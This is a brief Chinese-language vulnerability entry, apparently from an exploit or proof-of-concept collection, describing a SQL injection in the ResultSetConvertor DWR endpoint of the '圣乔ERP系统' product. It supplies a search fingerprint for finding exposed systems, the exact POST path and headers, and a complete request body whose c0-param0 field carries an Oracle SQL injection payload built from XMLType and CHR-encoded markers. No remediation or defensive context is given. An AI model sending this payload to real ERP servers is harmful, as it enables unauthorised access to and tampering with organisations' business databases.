# 圣乔ERP系统ResultSetConvertor存在SQL注入漏洞

- **系统**：圣乔ERP系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="圣乔ERP系统"`
- **请求**：`POST /erp/dwr/call/plaincall/ResultSetConvertor.queryForMapWithDefaultValues.dwr HTTP/1.1`
- **关键头**：`Content-Type: text/plain`　`Priority: u=0`

**请求体 / payload**
```
callCount=1
page=/erp/dwr/test/ResultSetConvertor
httpSessionId=
scriptSessionId=B4C02555EA992FF3A73F3CCA60389809871
c0-scriptName=ResultSetConvertor
c0-methodName=queryForMapWithDefaultValues
c0-id=0
c0-param0=(SELECT UPPER(XMLType(CHR(60)CHR(58)CHR(113)CHR(106)CHR(122)CHR(122)CHR(113)(SELECT (CASE WHEN (99=99) THEN 1 ELSE 0 END) FROM DUAL)CHR(113)CHR(118)CHR(122)CHR(118)CHR(113)CHR(62))) FROM DUAL)
c0-param1=Array:[]
batchId=4
```
- **预期**：200　|　—